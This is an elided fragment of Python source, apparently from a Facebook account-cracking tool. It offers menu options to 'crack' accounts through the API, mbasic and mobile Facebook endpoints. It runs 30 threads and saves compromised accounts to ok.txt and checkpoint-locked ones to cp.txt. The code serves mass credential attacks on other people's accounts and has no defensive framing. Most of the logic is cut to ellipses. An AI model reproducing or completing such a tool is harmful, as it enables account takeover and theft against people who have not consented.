...
def dekura_x():
	...
	print("%s [%s1%s] Crack from API (%sfast%s)"%(p,b,p,b,p))
	print("%s [%s2%s] Crack from Mbasic fb (%srekomendasi%s)"%(p,b,p,b,p))
	print("%s [%s3%s] Crack from Mobile.fb\n"%(p,b,p))
	...
	if dekurasayangara in [""]:
		...
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [%s•%s] find the OK accountd in : ok.txt\n %s[%s•%s] Find the cp accounts in : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] l!"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
